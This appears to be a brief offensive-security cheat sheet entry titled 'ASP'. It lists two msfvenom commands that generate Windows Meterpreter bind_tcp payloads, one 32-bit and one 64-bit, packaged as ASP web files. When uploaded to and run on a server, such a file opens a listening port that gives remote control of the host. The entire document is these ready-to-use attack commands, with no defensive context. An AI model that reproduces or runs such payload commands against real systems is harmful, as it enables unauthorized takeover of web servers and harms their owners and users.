# ASP

- x86 (32-bit) Payloads

`$ msfvenom -p windows/meterpreter/bind_tcp lport=<PORT> -f asp -o met-x86.asp`

- x86-64 (64-bit) Payloads

`$ msfvenom -p windows/x64/meterpreter/bind_tcp lport=<PORT> -f asp -o met-x64.asp`